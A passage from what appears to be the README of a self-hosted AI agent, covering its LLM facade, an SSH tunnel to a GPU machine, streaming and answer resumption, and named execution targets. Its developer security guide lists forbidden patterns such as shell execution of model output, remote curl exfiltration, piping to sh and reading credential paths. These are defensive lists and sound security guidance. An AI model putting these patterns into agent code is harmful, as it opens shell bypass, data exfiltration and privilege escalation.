| `LLMProvider` / `FacadeLlmClient` | Agent-side: `chat`, `chat_stream`, `healthcheck`, `close` |
| `AgentLlmFacade` | Stable `/api/chat`, `/api/tags`, `/api/info` HTTP surface |
| `OllamaEngine` / `VLLMEngine` | Server-side upstream adapters |
| SSH sandbox / tunnel | Optional: `ai-agent config remote-provider` (Ollama engine) |

**`LLM_HOST` vs `LLM_UPSTREAM`:** the agent only reads `LLM_HOST`. `LLM_UPSTREAM` is for `ai-agent-llm` — where the real engine listens. Never point `LLM_UPSTREAM` at the facade URL.

Command execution does not use `LLM_HOST`. See [Execution targets](#execution-targets).

### Upstream engines

By default (`LLM_MANAGE_UPSTREAM=true`), **`ai-agent-llm` starts and stops** the configured engine (`ollama serve` or `vllm serve …`) at `LLM_UPSTREAM`. Install Ollama or vLLM on the machine where `ai-agent-llm` runs — `pip install -e ".[dev]"` does not install them.

If the engine is already running at `LLM_UPSTREAM`, `ai-agent-llm` reuses it. Set `LLM_MANAGE_UPSTREAM=false` to attach without auto-start ([Path E](#path-e-attach-to-an-already-running-engine)).

### SSH remote provider

Prefer this over exposing Ollama on the LAN. Ollama stays on `127.0.0.1:11434` on the GPU PC. The agent opens a local port-forward with a **project-local** SSH config and keys (not `~/.ssh` at runtime).

```bat
ai-agent config remote-provider
```

The wizard prints GPU-box steps (Windows or Linux), can write `.env`, and never edits your user SSH config. To import an existing `Host` from `~/.ssh/config` it **copies** that host's key into `.ai-agent/ssh/` after a warning:

```bat
ai-agent config remote-provider --read-existing-ssh-hosts
```

Then:

```bat
ai-agent config remote-provider test
```

The first test asks you to trust the GPU PC's **sshd** host key and saves it in `.ai-agent/ssh/known_hosts` (not `~/.ssh`). That is required: the sandbox starts empty on purpose. You can also run `ai-agent config remote-provider trust-host` first.

```bat
ai-agent
```

`ai-agent config show` prints the current transport. `ai-agent config remote-provider disable` sets transport back to local HTTP.

On the GPU PC (same repo, Administrator PowerShell on Windows), install the printed key with:

```bat
ai-agent host-setup --public-key-file .ai-agent\ssh\host-setup.pub
```

That writes the correct authorized_keys file, restarts `sshd`, and checks Ollama on `127.0.0.1:11434`. Linux GPU hosts add `--linux`. Tailscale/WireGuard is optional: use that hostname as the SSH target.

### Two-window workflow (details)

Step-by-step checklist: [Path B — Two-window workflow](#path-b-two-window-workflow-same-machine).

Use this to run the model process and the agent as separate layers. With the default `LLM_MANAGE_UPSTREAM=true`, `ai-agent-llm` starts the engine for you. For vLLM, set `LLM_ENGINE=vllm` and `LLM_UPSTREAM=http://localhost:8000` before starting Window 1.

**Window 1 — model / facade**

```bat
ai-agent-llm
```

It healthchecks the upstream engine, warms the model with the same system prompt
and tools the agent uses, then listens on `127.0.0.1` (port `LLM_BIND_PORT`, or
an OS-chosen port if `0`). When ready it prints a URL, for example:

```text
Endpoint: http://127.0.0.1:52341

Copy this into .env, then start ai-agent in another terminal:
  LLM_HOST=http://127.0.0.1:52341
```

Leave that window open.

**Window 2 — API**

Set `LLM_HOST` to the printed URL, then start `ai-agent-serve`. That process calls the facade. Upstream `LLM_UPSTREAM` must not point at the facade URL.

The facade has no authentication. Keep `LLM_BIND_HOST=127.0.0.1`. Clients authenticate to `ai-agent-serve`, not to the facade.

### Connection errors

| When | What you see | What the CLI does |
|------|----------------|-------------------|
| Startup healthcheck fails (host down, refused, timeout, HTTP/protocol error) | `LLM endpoint unavailable: …` | Logs the error and **exits** (no REPL) |
| Startup: model name not present on that host | `ModelMissingError: the requested model '…' is not available with Ollama/vLLM …` | Logs the error and **exits** |
| Startup warmup fails after a passing healthcheck | `LLM warmup failed: …` | Logs the error and **exits** |
| Mid-chat: connect, timeout, HTTP, or bad JSON | Yellow `LLM error: …` (and any partial text) | Logs a warning and **stays in the REPL** so you can retry or quit |
| Mid-chat: SSH tunnel process died | Red message and `Exiting.` | Logs the error and **exits** |

The agent loop classifies failures with `LLMErrorKind` (`unavailable`, `timeout`, `http`, `protocol`, `model_not_found`, …), not vendor-specific strings.

---

## Streaming responses

When `AGENT_STREAM_RESPONSES=true` (the default), the CLI prints the model's answer as Ollama generates it, instead of waiting for the full reply.

### How it works

Final answers are written as **ordinary assistant text**. Ollama streams that content token-by-token over `/api/chat` with `stream: true`, and the CLI writes each chunk as it arrives.

Tool iterations (command execution, approvals, audit events) are not streamed. Only the user-facing answer text is.

Progress notes from the optional `respond` tool (`finished=false`) appear as dim status lines above the answer, not mixed into the streamed text.

### Limitations

**Tool-call arguments are not streamed incrementally.** Ollama typically delivers a complete tool call in one chunk when generation finishes, rather than streaming the JSON argument payload character by character.

That matters if a model puts its final answer inside `respond(message=...)` instead of writing plain assistant text. In that case the user still sees one flush at the end, not a live typewriter effect.

The system prompt steers models toward plain text for final answers, but smaller or less instruction-following models may ignore that and use `respond` anyway. If streaming feels like a blob, try a different model or check that the model is answering as prose rather than wrapping the reply in a tool call.

To disable streaming entirely, set `AGENT_STREAM_RESPONSES=false` in `.env`.

For a quick manual check against a live Ollama instance:

```bash
python scripts/stream_smoke_test.py "explain database migrations in three sentences"
```

The script prints chunk timing so you can confirm incremental output.

---

## Long answers and resuming

The agent finishes a turn when **it** decides it is done — by writing a complete plain-text answer, or by calling `respond(finished=true)`. Hitting a model or transport limit is not a decision, so those cases are resumed instead of ending the turn.

An answer is resumed when Ollama reports `done_reason: "length"`, or when the stream drops after partial output. Only the tail of the partial answer is resent, and text the model restates is trimmed so the output reads as one continuous answer. Trimming is deliberately conservative — it would rather leave a small seam at the join than delete content the model actually wrote.

To watch the resume path directly:

```bash
python scripts/resume_smoke_test.py
```

It reports chunk count, how many resumes happened, and the final length. Forcing `OLLAMA_NUM_PREDICT` low (for example `180`) makes resumes easy to observe.

### Why answers used to stop mid-sentence

Ollama's default context window is **4096 tokens**, shared between prompt and reply. A large system prompt plus a long answer exhausts it, which surfaces as `done_reason: "length"`. Resuming by appending the partial answer to the history made it worse — each attempt had less room than the last, until the model lost the beginning and started over.

Two things prevent that now:

- `OLLAMA_NUM_CTX` defaults to **16384** instead of Ollama's 4096
- Resume prompts are a fixed size: system prompt + request + last `AGENT_CONTINUATION_TAIL` characters

### Tuning

| Variable | Default | Effect |
|----------|---------|--------|
| `OLLAMA_NUM_CTX` | `16384` | Context window. Raise for longer answers, lower if VRAM is tight |
| `OLLAMA_NUM_PREDICT` | unset | Hard cap on reply tokens. Leave unset for uncapped replies |
| `AGENT_MAX_CONTINUATIONS` | `8` | How many times one answer may resume |
| `AGENT_CONTINUATION_TAIL` | `2000` | Characters of the partial answer resent when resuming |

If resumes are exhausted, the answer produced so far is kept and the CLI prints a note rather than truncating silently.

---

## Developer guide: avoiding security regressions

Read this before adding commands, tools, or policy rules.

### 1. Never add shell execution

```python
# FORBIDDEN
subprocess.run(command_string, shell=True)
subprocess.run(["/bin/sh", "-c", model_output])
```

```python
# CORRECT
subprocess.run(argv_list, shell=False)
```

### 2. Never trust model output

All tool arguments are **attacker-controlled input**. Validate structure (Pydantic) **and** semantics (policy engine).

### 3. Do not parse shell syntax from strings

If you need new chaining behavior, add a new **`CommandExpr` type** and validate it explicitly — do not regex-match user/model strings.

### 4. Expand allow-lists carefully

When adding policy rules, specify:

- binary name
- subcommand (if applicable)
- path argument requirements
- network restrictions (if applicable)
- risk level

Default for unmatched commands is **FORBIDDEN**.

### 5. Beware implicit privilege escalation

| Change | Risk |
|--------|------|
| Adding `ai` to `docker` group | Near-root access |
| Allowing `docker run` | Container escape / mount host FS |
| Allowing remote `curl` | Data exfiltration |
| Allowing `\| sh` or `xargs` | Full shell bypass |
| Broadening readable paths to `/` | Credential exposure |

### 6. Chain risk aggregation

When adding operators, compute effective risk as **max(segment risks)** and reject the whole expression if any segment is FORBIDDEN.

### 7. Do not let the model self-approve

Never encode approval as a tool result the model can write. Approval must come from the CLI input layer.

### 8. Test policy, not just happy paths

Add tests for:

- forbidden patterns
- path traversal
- network exfil attempts
- chained bypass attempts
- confirmation gates
- audit records on denial

Run tests:

```bash
pytest
```

---

## Project layout

```text
ai_agent/
  agent/          # Agent loop and tool schemas
  approval/       # Confirmation UX and session grants
  audit/          # Audit logging
  api/            # Public HTTP API (`ai-agent-serve`)
  conversations/  # SQLite transcript store and Alembic migrations
  cli/            # Terminal (`ai-agent`, `serve`, `config`, `host-setup`, `ai-agent-llm`)
  service/        # `ai-agent serve`: engine, facade, and API in one process
  commands/       # CommandExpr AST, render, executor
  execution_targets/  # Named local / SSH / Docker backends and router
  llm/            # client/ (agent), server/ (ai-agent-llm), http/, SSH tunnel
  policy/         # Risk levels, policy engine, default_policy.yaml
clients/android/  # Discord sign-in, then reads chats from ai-agent-serve
deploy/cloudflared/  # Example Cloudflare Tunnel config for Path F
deploy/systemd/   # Ubuntu service unit and installer (`ai-agent.service`)
supabase/         # SQL migrations (profiles only for now)
tests/
```

Android client (Discord sign-in, Supabase session + `profiles`): see [`clients/android/README.md`](clients/android/README.md).

---

## Execution targets

Approved commands run on a **named target** from configuration. The model picks a name such as `local` or `home-server`. It cannot supply a hostname, SSH key, or container ID.

| Type | Meaning |
|------|---------|
| `local` | This machine (always present). The usual default when the model omits `target`. |
| `ssh` | Remote host. One generated ed25519 key per target under `.ai-agent/execution-targets/<name>/`. |
| `docker` | `docker exec` into an existing container. Optional `user` (wizard default `root`) maps to `docker exec -u`, so you do not need sudo or a password inside the image. |

This is separate from where the LLM runs (`LLM_HOST` / `remote-provider`).

```bat
ai-agent config execution-target
ai-agent config execution-target list
ai-agent config execution-target trust home-server
```

The wizard can reuse **host / user / port** from `~/.ssh/config`, then generates a **new** key for the agent. Existing personal keys are not copied and are not used at runtime.

SSH public keys belong in the remote user's `authorized_keys`. Host keys are stored per target (not in `~/.ssh`).

## Roadmap (not yet implemented)

- Android approval and sending a turn from the phone
- Web UI with the same approval token model
- AppArmor / Landlock profiles
- OS-level network restrictions for `ai` user
- Persistent memory, scheduled tasks, notifications
- Additional LLM providers

---

## License

MIT
